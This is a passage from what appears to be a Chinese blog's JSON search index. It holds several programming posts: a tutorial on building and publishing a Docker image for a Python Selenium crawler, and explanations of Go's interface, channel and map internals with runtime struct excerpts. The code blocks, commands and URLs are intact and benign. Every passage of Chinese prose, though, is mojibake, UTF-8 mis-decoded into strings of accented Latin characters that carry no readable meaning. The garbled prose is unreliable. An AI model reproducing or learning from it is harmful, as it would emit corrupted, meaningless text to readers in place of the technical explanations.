/zk8/\n```\n\n.dockerignoreæ–‡ä»¶\n\n```\nchromedriver\n*.sh\n.*\n**/__pycache__/\nDockerfile\n```\n\n\n\n### 3. æµ‹è¯• dockerfile\n\n##### 3.1 é•œåƒåŠ é€Ÿ\n\nåœ¨æœ¬åœ°æµ‹è¯•çš„æ—¶å€™, å‘ç°è¿Alpineéƒ½æ‹‰å–ä¸ä¸‹æ¥, æ­¤å¤„æ„Ÿè°¢ä¼Ÿå¤§çš„ great wall. äºæ˜¯é€‰æ‹©é˜¿é‡Œäº‘åŠ é€Ÿ.\n\nhttps://cr.console.aliyun.com/cn-hangzhou/instances/mirrors\n\nå³é”®ç‚¹å‡»æ¡Œé¢é¡¶æ çš„ docker å›¾æ ‡ï¼Œé€‰æ‹© Preferences ï¼Œåœ¨ Daemon æ ‡ç­¾ï¼ˆDocker 17.03 ä¹‹å‰ç‰ˆæœ¬ä¸º Advanced æ ‡ç­¾ï¼‰ä¸‹çš„ Registry mirrors åˆ—è¡¨ä¸­\n\nå°† https://xxxxxxxxx.mirror.aliyuncs.com åŠ åˆ° \"registry-mirrors\" çš„æ•°ç»„é‡Œï¼Œç‚¹å‡»Apply & Restart æŒ‰é’®ï¼Œç­‰å¾… Docker é‡å¯å¹¶åº”ç”¨é…ç½®çš„é•œåƒåŠ é€Ÿå™¨ã€‚\n\nps: å°±æ˜¯é˜¿é‡Œäº‘åŠ é€Ÿ, åœ¨åç»­çš„å®‰è£…è½¯ä»¶ä¸­ä¹Ÿæ˜¯ç‰¹åˆ«æ…¢, æ­¤å¤„å»ºè®®åœ¨äº‘æœåŠ¡å™¨ä¸Š(å…è´¹çš„è°·æ­Œäº‘)æ“ä½œ.\n\n##### 3.2 æµ‹è¯•\n\n```bash\ndocker build -t zk8:0.1 .   #  åˆ¶ä½œ image\ndocker run -ti --rm zk8:0.1 /bin/sh   # å¯åŠ¨å®¹å™¨ç»“æŸååˆ é™¤, ç”¨è¿™ç§æ–¹æ³•å¯ä»¥éå¸¸æ–¹ä¾¿æµ‹è¯•\n```\n\nå‰æœŸå¯ä»¥é€šè¿‡ shell è¿›å…¥åˆ°å®¹å™¨é‡Œé¢æµ‹è¯•, åœ¨é‡Œé¢å°è¯•å®‰è£…ç›¸åº”çš„è½¯ä»¶åŒ…, ç„¶åå†å†™ dockerfileä¼šæ¯”è¾ƒæ–¹ä¾¿\n\n\n\n### 4. å®‰è£…è½¯ä»¶åŒ…\n\nçˆ¬è™«ç”¨ python å†™çš„, å¹¶ä¸”ä½¿ç”¨äº† selenium + æ— å¤´æµè§ˆå™¨. æ‰€ä»¥å®‰è£…åŒ…è¦å†™åœ¨ dockerfileé‡Œ, æ–‡ä»¶å¦‚ä¸‹:\n\n```dockerfile\nFROM alpine\n\nRUN mkdir -p /zk8\nCOPY . /zk8/\n\n# install python\nRUN echo \"**** install python ****\" && \\\n                apk add --no-cache python3 && \\\n                if [ ! -e /usr/bin/python ]; then ln -sf python3 /usr/bin/python ; fi && \\\n                echo \"**** install pip ****\" && \\\n                python3 -m ensurepip && \\\n                rm -r /usr/lib/python*/ensurepip && \\\n                pip3 install --no-cache --upgrade pip setuptools wheel && \\\n                if [ ! -e /usr/bin/pip ]; then ln -s pip3 /usr/bin/pip ; fi\n\n# install python package\nRUN apk add --no-cache py-lxml && \\\n                apk add --no-cache chromium && \\\n                apk add --no-cache chromium-chromedriver && \\\n                if [ -e /usr/bin/chromedriver ]; then ln -s /usr/bin/chromedriver /zk8/chromedriver ; fi && \\\n                pip install selenium && \\\n                pip install bearychat && \\\n                pip install pyquery\n\n\nWORKDIR /zk8\nCMD python3 main.py\n```\n\n\n\n### 5. å‘å¸ƒåˆ° dockerhub\n\nå»ºè®®å»ºç«‹è‡ªå·±çš„ç§æœ‰ä»“åº“, å› ä¸º dockerhub å¯ä»¥å…è´¹ä½¿ç”¨ä¸€ä¸ªç§æœ‰ä»“åº“, æ­¤å¤„ä¸Šä¼ åˆ° dockerhub.\n\n```bash\ndocker login # ç™»å½•è‡ªå·±çš„ dockerhub å¸å·\n\ndocker tag zk8:0.1 levonfly/zk8:0.1 # æ­¤å¤„æ‰“ tag, æ ¼å¼è¦ä»¥ ç”¨æˆ·å/é•œåƒåå­—:ç‰ˆæœ¬å·\n\ndocker push levonfly/zk8:0.1 # æ¨é€åˆ° dockerhub\n```\n\ndockerhub ä¸Šè¿˜å¯ä»¥ link åˆ°github, å³ github ä¸€æ›´æ–°ä»£ç å°±é‡æ–° build.\n\næ¥ä¸‹æ¥å°±æ˜¯æ¿€åŠ¨äººå¿ƒçš„æ—¶åˆ», åœ¨ä»»ä½•å®‰è£… docker çš„æœºå™¨ä¸Šç›´æ¥è¿è¡Œè‡ªå·±çš„çˆ¬è™«.\n\n```bash\ndocker pull levonfly/zk8:0.1\ndocker run -d --name zk8 levonfly/zk8:0.1 \n```\n\n\n\n\n\n","tags":["docker"],"categories":["python"]},{"title":"golangçš„interfaceåº•å±‚ç»“æ„","url":"%2Fp%2Fb29169bf.html","content":"\nåœ¨ Go è¯­è¨€ä¸­ï¼Œinterface å’Œå‡½æ•°ä¸€æ ·ï¼Œéƒ½æ˜¯â€œç¬¬ä¸€å…¬æ°‘â€ã€‚interface å¯ä»¥ç”¨åœ¨ä»»ä½•ä½¿ç”¨å˜é‡çš„åœ°æ–¹ã€‚å¯ä»¥ä½œä¸ºç»“æ„ä½“å†…çš„å­—æ®µï¼Œå¯ä»¥ä½œä¸ºå‡½æ•°çš„å½¢å‚å’Œè¿”å›å€¼ï¼Œå¯ä»¥ä½œä¸ºå…¶ä»– interface å®šä¹‰çš„å†…åµŒå­—æ®µã€‚\n\ninterface åœ¨å¤§å‹é¡¹ç›®ä¸­å¸¸å¸¸ç”¨æ¥è§£è€¦ã€‚åœ¨å±‚ä¸å±‚ä¹‹é—´ç”¨ interface è¿›è¡ŒæŠ½è±¡å’Œè§£è€¦ã€‚ç”±äº Go interface éä¾µå…¥çš„è®¾è®¡ï¼Œä½¿å¾—æŠ½è±¡å‡ºæ¥çš„ä»£ç ç‰¹åˆ«ç®€æ´ï¼Œè¿™ä¹Ÿç¬¦åˆ Go è¯­è¨€è®¾è®¡ä¹‹åˆçš„å“²å­¦ã€‚\n\n<!-- more -->\n\n# 1. æºç \n\næºç è·¯å¾„ï¼š https://github.com/golang/go/blob/master/src/runtime/runtime2.go\n\n`iface` å’Œ `eface` éƒ½æ˜¯ Go ä¸­æè¿°interface{}çš„åº•å±‚ç»“æ„ä½“ï¼ŒåŒºåˆ«åœ¨äº `iface` æè¿°çš„æ¥å£åŒ…å«æ–¹æ³•ï¼Œè€Œ `eface` åˆ™æ˜¯ä¸åŒ…å«ä»»ä½•æ–¹æ³•çš„ç©ºæ¥å£ï¼š`interface{}`ã€‚\n\n```go\ntype iface struct {\n\ttab  *itab\n\tdata unsafe.Pointer\n}\n\ntype eface struct {\n\t_type *_type\n\tdata  unsafe.Pointer\n}\n```\n\n### 1.1 éç©º interface æ•°æ®ç»“æ„\n\n```go\ntype iface struct {\n\ttab  *itab\n\tdata unsafe.Pointer\n}\n\ntype itab struct {\n\tinter *interfacetype\n\t_type *_type\n\thash  uint32 // copy of _type.hash. Used for type switches.\n\t_     [4]byte\n\tfun   [1]uintptr // variable sized. fun[0]==0 means _type does not implement inter.\n}\n```\n\ntab ä¸­å­˜æ”¾çš„æ˜¯ç±»å‹ã€æ–¹æ³•ç­‰ä¿¡æ¯ã€‚data æŒ‡é’ˆæŒ‡å‘çš„ iface ç»‘å®šå¯¹è±¡çš„åŸå§‹æ•°æ®çš„å‰¯æœ¬ã€‚è¿™é‡ŒåŒæ ·éµå¾ª Go çš„ç»Ÿä¸€è§„åˆ™ï¼Œå€¼ä¼ é€’ã€‚\n\n\n\nitab ä¸­åŒ…å« 5 ä¸ªå­—æ®µã€‚\n\n+ inner å­˜çš„æ˜¯ interface è‡ªå·±çš„é™æ€ç±»å‹ã€‚å› ä¸º Go è¯­è¨€ä¸­å‡½æ•°æ–¹æ³•æ˜¯ä»¥åŒ…ä¸ºå•ä½éš”ç¦»çš„ã€‚æ‰€ä»¥ interfacetype é™¤äº†ä¿å­˜ _type è¿˜éœ€è¦ä¿å­˜åŒ…è·¯å¾„ç­‰æè¿°ä¿¡æ¯ã€‚\n\n+ `_type` å­˜çš„æ˜¯ interface å¯¹åº”å…·ä½“å¯¹è±¡çš„ç±»å‹ã€‚itab ä¸­çš„ `_type` å’Œ iface ä¸­çš„ data èƒ½ç®€è¦æè¿°ä¸€ä¸ªå˜é‡ã€‚\n\n+ è¿™é‡Œçš„ hash å­—æ®µå’Œ _type ä¸­å­˜çš„ hash å­—æ®µæ˜¯å®Œå…¨ä¸€è‡´çš„ï¼Œè¿™ä¹ˆåšçš„ç›®çš„æ˜¯ä¸ºäº†ç±»å‹æ–­è¨€ã€‚\n\n+ fun æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘çš„æ˜¯å…·ä½“ç±»å‹çš„å‡½æ•°æ–¹æ³•ã€‚è™½ç„¶è¿™é‡Œåªæœ‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä½†æ˜¯å®ƒå¯ä»¥è°ƒç”¨å¾ˆå¤šæ–¹æ³•ã€‚\n\n<img src=\"golangçš„interfaceåº•å±‚ç»“æ„/iface_all.jpeg\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" style=\"zoom:40%;\" />\n\n+ å®ä¾‹\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\ntype Binary uint64\n\nfunc (i Binary) String() string {\n\treturn strconv.FormatUint(uint64(i), 10)\n}\n\nfunc main() {\n\tb := Binary(200)\n\tany := fmt.Stringer(b) // interfaceåŒ…è£…\n\tfmt.Println(any) // 200\n}\n```\n\n<img src=\"golangçš„interfaceåº•å±‚ç»“æ„/iface_fuzhi.jpeg\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" style=\"zoom:150%;\" />\n\n### 1.2 ç©º interface æ•°æ®ç»“æ„\n\nç©ºçš„ inferface{} æ˜¯æ²¡æœ‰æ–¹æ³•é›†çš„æ¥å£ã€‚æ‰€ä»¥ä¸éœ€è¦ itab æ•°æ®ç»“æ„ã€‚å®ƒåªéœ€è¦å­˜ç±»å‹å’Œç±»å‹å¯¹åº”çš„å€¼å³å¯ã€‚å¯¹åº”çš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š\n\n```go\ntype eface struct {\n\t_type *_type\n\tdata  unsafe.Pointer\n}\n```\n\nä»è¿™ä¸ªæ•°æ®ç»“æ„å¯ä»¥çœ‹å‡ºï¼Œåªæœ‰å½“ 2 ä¸ªå­—æ®µéƒ½ä¸º nilï¼Œç©ºæ¥å£æ‰ä¸º nilã€‚ç©ºæ¥å£çš„ä¸»è¦ç›®çš„æœ‰ 2 ä¸ªï¼Œä¸€æ˜¯å®ç°â€œæ³›å‹â€ï¼ŒäºŒæ˜¯ä½¿ç”¨åå°„ã€‚\n\n+ å®ä¾‹\n\n```go\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\ntype Binary uint64\n\nfunc main() {\n\tb := Binary(200)\n\tany := (interface{})(b)\n\tfmt.Println(any) //200\n}\n```\n\n<img src=\"golangçš„interfaceåº•å±‚ç»“æ„/eface_fuzhi.jpeg\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" style=\"zoom:150%;\" />\n\n\n\n### 1.3 _type ç±»å‹\n\nç”±äº Go è¯­è¨€æ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œç¼–è¯‘æ—¶å¯¹æ¯ä¸ªå˜é‡çš„ç±»å‹ä¿¡æ¯åšå¼ºæ ¡éªŒï¼Œæ‰€ä»¥æ¯ä¸ªç±»å‹çš„å…ƒä¿¡æ¯è¦ç”¨ä¸€ä¸ªç»“æ„ä½“æè¿°ã€‚å†è€… Go çš„åå°„ä¹Ÿæ˜¯åŸºäºç±»å‹çš„å…ƒä¿¡æ¯å®ç°çš„ã€‚`_type` å°±æ˜¯æ‰€æœ‰ç±»å‹æœ€åŸå§‹çš„å…ƒä¿¡æ¯ã€‚\n\n https://github.com/golang/go/blob/master/src/runtime/type.go\n\n```go\ntype _type struct {\n\tsize       uintptr // ç±»å‹å ç”¨å†…å­˜å¤§å°\n\tptrdata    uintptr // åŒ…å«æ‰€æœ‰æŒ‡é’ˆçš„å†…å­˜å‰ç¼€å¤§å°\n\thash       uint32  // ç±»å‹ hash\n\ttflag      tflag   // æ ‡è®°ä½ï¼Œä¸»è¦ç”¨äºåå°„\n\talign      uint8   // å¯¹é½å­—èŠ‚ä¿¡æ¯\n\tfieldAlign uint8   // å½“å‰ç»“æ„å­—æ®µçš„å¯¹é½å­—èŠ‚æ•°\n\tkind       uint8   // åŸºç¡€ç±»å‹æšä¸¾å€¼, å¦‚ boolã€intã€floatã€stringã€structã€interface ç­‰ã€‚\n\tequal func(unsafe.Pointer, unsafe.Pointer) bool // æ¯”è¾ƒä¸¤ä¸ªå½¢å‚å¯¹åº”å¯¹è±¡çš„ç±»å‹æ˜¯å¦ç›¸ç­‰\n\tgcdata    *byte    // GC ç±»å‹çš„æ•°æ®\n\tstr       nameOff  // ç±»å‹åç§°å­—ç¬¦ä¸²åœ¨äºŒè¿›åˆ¶æ–‡ä»¶æ®µä¸­çš„åç§»é‡\n\tptrToThis typeOff  // ç±»å‹å…ƒä¿¡æ¯æŒ‡é’ˆåœ¨äºŒè¿›åˆ¶æ–‡ä»¶æ®µä¸­çš„åç§»é‡\n}\n```\n\n _type æ˜¯æ‰€æœ‰ç±»å‹åŸå§‹ä¿¡æ¯çš„å…ƒä¿¡æ¯ã€‚ä¾‹å¦‚åœ¨ arraytype å’Œ chantype ä¸­ä¿å­˜ç±»å‹çš„å…ƒä¿¡æ¯å°±æ˜¯é  _typeã€‚\n\n```go\ntype arraytype struct {\n\ttyp   _type\n\telem  *_type\n\tslice *_type\n\tlen   uintptr\n}\n\ntype chantype struct {\n\ttyp  _type\n\telem *_type\n\tdir  uintptr\n}\n```\n\n# 2.  Type Assertion æ–­è¨€\n\næˆ‘ä»¬çŸ¥é“ä½¿ç”¨ interface æ–­è¨€çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œä¸ç„¶å¾ˆå®¹æ˜“å¼•å…¥ panicã€‚\n\n### 2.1 æ–­è¨€\n\n```go\nfunc do(v interface{}) {\n    n := v.(int)    // might panic\n}\n\nfunc do(v interface{}) {\n    n, ok := v.(int)\n    if !ok {\n        // æ–­è¨€å¤±è´¥å¤„ç†\n    }\n}\n```\n\nè¿™ä¸ªè¿‡ç¨‹ä½“ç°åœ¨ä¸‹é¢çš„å‡ ä¸ªå‡½æ•°ä¸Šã€‚\n\n```go\n// The assertXXX functions may fail (either panicking or returning false,\n// depending on whether they are 1-result or 2-result).\nfunc assertI2I(inter *interfacetype, i iface) (r iface) {\n    tab := i.tab\n    if tab == nil {\n        // explicit conversions require non-nil interface value.\n        panic(&TypeAssertionError{\"\", \"\", inter.typ.string(), \"\"})\n    }\n    if tab.inter == inter {\n        r.tab = tab\n        r.data = i.data\n        return\n    }\n    r.tab = getitab(inter, tab._type, false)\n    r.data = i.data\n    return\n}\nfunc assertI2I2(inter *interfacetype, i iface) (r iface, b bool) {\n    tab := i.tab\n    if tab == nil {\n        return\n    }\n    if tab.inter != inter {\n        tab = getitab(inter, tab._type, true)\n        if tab == nil {\n            return\n        }\n    }\n    r.tab = tab\n    r.data = i.data\n    b = true\n    return\n}\n\n// ç±»ä¼¼\nfunc assertE2I(inter *interfacetype, e eface) (r iface)\nfunc assertE2I2(inter *interfacetype, e eface) (r iface, b bool)\n```\n\n### 2.2 æ€»ç»“\n\n+ æœ‰å‡½æ•°çš„æ˜¯ifaceï¼Œç©ºå‡½æ•°çš„æ˜¯efaceã€‚\n+ iface é‡Œ data æ•°æ®æŒ‡é’ˆï¼Œitab é‡Œé¢ func å‡½æ•°æŒ‡é’ˆï¼ŒæŒ‡å‘æ–¹æ³•é›†ã€‚\n+ ä¸¤ä¸ªåº•å±‚å®ç°éƒ½æœ‰ä¸€ä¸ª `_type` ç»“æ„ï¼Œè¿›è¡Œæ–­è¨€ã€‚\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://halfrost.com/go_interface/\n+ https://i6448038.github.io/2018/10/01/Golang-interface/\n+ http://legendtkl.com/2017/07/01/golang-interface-implement/\n","tags":["golang"],"categories":["2_golangåº•å±‚"]},{"title":"golangçš„channelåº•å±‚ç»“æ„","url":"%2Fp%2F94554c31.html","content":"\n# 1. æºç \n\næºç è·¯å¾„ï¼š https://github.com/golang/go/blob/master/src/runtime/chan.go\n\n```go\ntype hchan struct {\n\tqcount   uint           // é˜Ÿåˆ—ä¸­æ‰€æœ‰æ•°æ®æ€»æ•°\n\tdataqsiz uint            // ç¯å½¢é˜Ÿåˆ—çš„ size\n\tbuf      unsafe.Pointer // æŒ‡å‘ dataqsiz é•¿åº¦çš„æ•°ç»„\n\telemsize uint16         // å…ƒç´ å¤§å°\n\tclosed   uint32\n\telemtype *_type  // å…ƒç´ ç±»å‹\n\tsendx    uint    // å·²å‘é€çš„å…ƒç´ åœ¨ç¯å½¢é˜Ÿåˆ—ä¸­çš„ä½ç½®\n\trecvx    uint    // å·²æ¥æ”¶çš„å…ƒç´ åœ¨ç¯å½¢é˜Ÿåˆ—ä¸­çš„ä½ç½®\n\trecvq    waitq   // æ¥æ”¶è€…çš„ç­‰å¾…é˜Ÿåˆ—\n\tsendq    waitq   // å‘é€è€…çš„ç­‰å¾…é˜Ÿåˆ—\n\n\t// lock é”ä¿æŠ¤ hchan ä¸­çš„æ‰€æœ‰å­—æ®µï¼Œä»¥åŠæ­¤é€šé“ä¸Šè¢«é˜»å¡çš„ sudogs ä¸­çš„å¤šä¸ªå­—æ®µã€‚æŒæœ‰ lock çš„æ—¶å€™ï¼Œç¦æ­¢æ›´æ”¹å¦ä¸€ä¸ª G çš„çŠ¶æ€ï¼ˆç‰¹åˆ«æ˜¯ä¸è¦ä½¿ G çŠ¶æ€å˜æˆreadyï¼‰ï¼Œå› ä¸ºè¿™ä¼šå› ä¸ºå †æ ˆ shrinking è€Œå‘ç”Ÿæ­»é”ã€‚\n\tlock mutex // é”\n}\n```\n\n<!-- more -->\n\n![img](golangçš„channelåº•å±‚ç»“æ„/149_5_.png)\n\nrecvq å’Œ sendq æ˜¯ç­‰å¾…é˜Ÿåˆ—ï¼Œæ•°æ®ç»“æ„æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ã€‚\n\n```go\ntype waitq struct {\n\tfirst *sudog\n\tlast  *sudog\n}\n```\n\nchannel æœ€æ ¸å¿ƒçš„æ•°æ®ç»“æ„æ˜¯ **sudo**gã€‚sudog ä»£è¡¨äº†ä¸€ä¸ªåœ¨ç­‰å¾…é˜Ÿåˆ—ä¸­çš„ gï¼Œsudog å®é™…ä¸Šæ˜¯å¯¹ goroutine çš„ä¸€ä¸ªå°è£…ã€‚\n\nsudog æ˜¯ Go ä¸­éå¸¸é‡è¦çš„æ•°æ®ç»“æ„ï¼Œå› ä¸º g ä¸åŒæ­¥å¯¹è±¡å…³ç³»æ˜¯å¤šå¯¹å¤šçš„ã€‚ä¸€ä¸ª g å¯ä»¥å‡ºç°åœ¨è®¸å¤šç­‰å¾…é˜Ÿåˆ—ä¸Šã€‚å¹¶ä¸”å¤šä¸ª g å¯èƒ½æ­£åœ¨ç­‰å¾…åŒä¸€ä¸ªåŒæ­¥å¯¹è±¡ï¼Œå› æ­¤ä¸€ä¸ªå¯¹è±¡å¯èƒ½æœ‰è®¸å¤š sudogã€‚\n\n### 1.1 å­—æ®µè¯´æ˜\n\n+ buf æŒ‡å‘åº•å±‚å¾ªç¯æ•°ç»„ï¼Œåªæœ‰æœ‰ç¼“å†²å‹çš„ channel æ‰ç”¨ã€‚\n\n+ sendxï¼Œrecvx å‡æŒ‡å‘åº•å±‚å¾ªç¯æ•°ç»„ï¼Œè¡¨ç¤ºå½“å‰å¯ä»¥å‘é€å’Œæ¥æ”¶çš„å…ƒç´ ä½ç½®ç´¢å¼•å€¼ï¼ˆç›¸å¯¹äºåº•å±‚æ•°ç»„ï¼‰ã€‚\n\n+ sendqï¼Œrecvq åˆ†åˆ«è¡¨ç¤ºè¢«é˜»å¡çš„ goroutine åŒå‘é“¾è¡¨é˜Ÿåˆ—ã€‚è¿™äº› goroutine ç”±äºå°è¯•è¯»å– channel æˆ–å‘ channel å‘é€æ•°æ®è€Œè¢«é˜»å¡ã€‚\n+ lock ç”¨æ¥ä¿è¯æ¯ä¸ªè¯» channel æˆ–å†™ channel çš„æ“ä½œéƒ½æ˜¯åŸå­çš„ã€‚\n\n### 1.2 æµç¨‹\n\n```go\nch := make(chan Task, 3)\n```\n\nåˆ›å»ºchannelå®é™…ä¸Šå°±æ˜¯åœ¨å†…å­˜ä¸­å®ä¾‹åŒ–äº†ä¸€ä¸ª`hchan`çš„ç»“æ„ä½“ï¼Œå¹¶è¿”å›ä¸€ä¸ªchæŒ‡é’ˆã€‚\n\n##### 1. å‘é€æ•°æ®æµç¨‹\n\n+ å¯ä»¥çœ‹åˆ°sendx ä» 0 å˜æˆ 2ï¼Œå› ä¸ºæ˜¯å¾ªç¯æ•°ç»„ï¼Œæ»¡äº†åˆå˜æˆäº†0\n\n![1](golangçš„channelåº•å±‚ç»“æ„/1.gif)\n\n##### 2. æ»¡äº†å†å‘é€é˜»å¡\n\nå½“G1å‘bufå·²ç»æ»¡äº†çš„chå‘é€æ•°æ®çš„æ—¶å€™ï¼Œå½“runtineæ£€æµ‹åˆ°å¯¹åº”çš„hchançš„bufå·²ç»æ»¡äº†ï¼Œä¼šé€šçŸ¥è°ƒåº¦å™¨ï¼Œè°ƒåº¦å™¨ä¼šå°†G1çš„çŠ¶æ€è®¾ç½®ä¸ºwaitingï¼Œå½“G1å˜ä¸ºwaitingçŠ¶æ€åï¼Œä¼šåˆ›å»ºä¸€ä¸ªä»£è¡¨è‡ªå·±çš„sudogçš„ç»“æ„ï¼Œç„¶åæ”¾åˆ°sendqè¿™ä¸ªlistä¸­ã€‚\n\n\n\n<img src=\"golangçš„channelåº•å±‚ç»“æ„/4de75e36ac9aecd225130f7d7cc6d1be.png\" alt=\"img\" style=\"zoom:30%;\" />\n\n##### 3. å…¶ä»–åç¨‹å–å‡ºæ•°æ®\n\né¦–å…ˆ G2 è¯»å–å…ƒç´ ä¹‹åï¼Œå°† G1 çš„çŠ¶æ€å˜ä¸º goreadyã€‚\n\n<img src=\"golangçš„channelåº•å±‚ç»“æ„/8eb4fb0e129dd75dcaaaf8765317f2e4.png\" alt=\"img\" style=\"zoom:45%;\" />\n\nç„¶å G1 ä»åŸå…ˆçš„ waiting çŠ¶æ€å˜ä¸º runnable çŠ¶æ€ï¼Œç„¶åé‡æ–°æ”¾å…¥ P çš„ local queue ä¸­ç­‰å¾…è°ƒåº¦ã€‚\n\n<img src=\"golangçš„channelåº•å±‚ç»“æ„/5e4247a05b082330a5ce05068868381d.png\" alt=\"img\" style=\"zoom:45%;\" />\n\n\n\n# 2. æ€»ç»“\n\n+ åº•å±‚åªæœ‰ä¸€ä¸ªç¯å½¢æ•°ç»„ï¼Œæœ‰ç¼“å†²çš„channelæ‰æœ‰ã€‚ä¸¤ä¸ªindexï¼Œä¸€ä¸ªsendxï¼Œä¸€ä¸ªrecvxã€‚\n+ ä¸¤ä¸ªåŒå‘é“¾è¡¨é˜Ÿåˆ—ï¼Œä¸€ä¸ªsendqï¼Œä¸€ä¸ªrecvqï¼Œä¸Šé¢å­˜ç€é˜»å¡çš„GåŒ–èº«çš„sudogã€‚\n+ å¦‚æœGé˜»å¡ï¼ŒGä¼šè®©å‡ºè‡ªå·±ï¼Œå˜èº«sudogï¼ŒæŒ‚åœ¨ä¸Šé¢çš„é˜Ÿåˆ—ä¸Šã€‚\n+ è¿˜æœ‰ä¸€æŠŠé”ï¼Œä¿æŠ¤è¯» channel æˆ–å†™ channel çš„æ“ä½œéƒ½æ˜¯åŸå­çš„ã€‚\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://halfrost.com/go_channel/\n+ https://i6448038.github.io/2019/04/11/go-channel/\n\n+ https://xie.infoq.cn/article/d633c88db407c5c400552c377\n\n+ https://www.cnblogs.com/qcrao-2018/p/11220651.html\n","tags":["golang"],"categories":["2_golangåº•å±‚"]},{"title":"golangçš„mapå®ç°åŸç†","url":"%2Fp%2F3d5029a4.html","content":"\nmap æ˜¯ä¸€ç§key-valueçš„é”®å€¼å¯¹å­˜å‚¨ç»“æ„ï¼Œå…¶ä¸­keyä¸èƒ½é‡å¤ï¼Œåº•å±‚ç”¨hashè¡¨å­˜å‚¨ã€‚Go map çš„ hash è¡¨ä¸­çš„åŸºæœ¬å•ä½æ˜¯æ¡¶ï¼Œæ¯ä¸ªæ¡¶æœ€å¤šå­˜ 8 ä¸ªé”®å€¼å¯¹ï¼Œè¶…äº†åˆ™ä¼šé“¾æ¥åˆ°é¢å¤–çš„æº¢å‡ºæ¡¶ã€‚æ‰€ä»¥ Go map åŸºæœ¬æ•°æ®ç»“æ„æ˜¯hashæ•°ç»„+æ¡¶å†…çš„key-valueæ•°ç»„+æº¢å‡ºçš„æ¡¶é“¾è¡¨ã€‚\n\n<!-- more -->\n\n# 1. æºç \n\nhttps://github.com/golang/go/blob/master/src/runtime/map.go#L117C5-L117C5\n\n```go\n type hmap struct {\n     count     int    // å…ƒç´ çš„ä¸ªæ•°\n     B         uint8  // buckets æ•°ç»„çš„é•¿åº¦å°±æ˜¯ 2^B ä¸ª\n     overflow uint16 // æº¢å‡ºæ¡¶çš„æ•°é‡\n \n     buckets    unsafe.Pointer // 2^Bä¸ªæ¡¶å¯¹åº”çš„æ•°ç»„æŒ‡é’ˆ\n     oldbuckets unsafe.Pointer  // å‘ç”Ÿæ‰©å®¹æ—¶ï¼Œè®°å½•æ‰©å®¹å‰çš„bucketsæ•°ç»„æŒ‡é’ˆ\n \n     extra *mapextra //ç”¨äºä¿å­˜æº¢å‡ºæ¡¶çš„åœ°å€\n }\n \n type mapextra struct {\n     overflow    *[]*bmap\n     oldoverflow *[]*bmap\n\n     nextOverflow *bmap\n }\n\n type bmap struct {\n     tophash [bucketCnt]uint8\n }\n\n //ç¼–è¯‘æœŸé—´ä¼šç»™å®ƒåŠ æ–™ï¼ŒåŠ¨æ€åœ°åˆ›å»ºä¸€ä¸ªæ–°çš„ç»“æ„ï¼š\ntype bmap struct {\n    topbits  [8]uint8\n    keys     [8]keytype\n    values   [8]valuetype\n    pad      uintptr\n    overflow uintptr\n}\n```\n\nåœ¨goçš„mapå®ç°ä¸­ï¼Œå®ƒçš„åº•å±‚ç»“æ„ä½“æ˜¯hmapï¼Œhmapï¼ˆhashmapï¼‰é‡Œç»´æŠ¤ç€è‹¥å¹²ä¸ªbucketæ•°ç»„ã€‚\n\nBucketæ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ éƒ½æ˜¯bmapç»“æ„ï¼Œæ¯ä¸ªæ¡¶ä¸­ä¿å­˜äº†8ä¸ªkvå¯¹ï¼Œå¦‚æœ8ä¸ªæ»¡äº†ï¼Œåˆæ¥äº†ä¸€ä¸ªkeyè½åœ¨äº†è¿™ä¸ªæ¡¶é‡Œï¼Œä¼šä½¿ç”¨overflowè¿æ¥ä¸‹ä¸€ä¸ªæ¡¶(æº¢å‡ºæ¡¶)ã€‚\n\nhmapè¿™ä¸ªç»“æ„ä½“å¹¶ä¸ä¼šå­˜å‚¨å®é™…çš„æ•°æ®ï¼Œå®é™…å­˜å‚¨æ•°æ®çš„æ˜¯bmapç»“æ„ä½“ã€‚\n\n<img src=\"golangçš„mapå®ç°åŸç†/7f281ea45dfc4969a3ebba2239abb2ed~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom: 50%;\" />\n\n### 1.1 æ•°æ®è·å–è¿‡ç¨‹\n\nå‡è®¾å½“å‰ B=4 å³æ¡¶æ•°é‡ä¸º2^B=16ä¸ªï¼Œè¦ä»mapä¸­è·å– k4 å¯¹åº”çš„valueã€‚\n\n<img src=\"golangçš„mapå®ç°åŸç†/ad3bb9b394d740cea79068f5785f61e0~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom:50%;\" />\n\nâ‘ è®¡ç®—k4çš„hashå€¼ï¼Œè®¡ç®—ç»“æœæœ‰64ä¸ªæ¯”ç‰¹ä½ã€‚\n\nâ‘¡é€šè¿‡æœ€åçš„â€œBâ€ä½æ¥ç¡®å®šåœ¨å“ªå·æ¡¶ï¼Œæ­¤æ—¶Bä¸º4ï¼Œæ‰€ä»¥å–k4å¯¹åº”å“ˆå¸Œå€¼çš„å4ä½ï¼Œä¹Ÿå°±æ˜¯0101ï¼Œ0101ç”¨åè¿›åˆ¶è¡¨ç¤ºä¸º5ï¼Œæ‰€ä»¥åœ¨5å·æ¡¶ã€‚\n\nâ‘¢æ 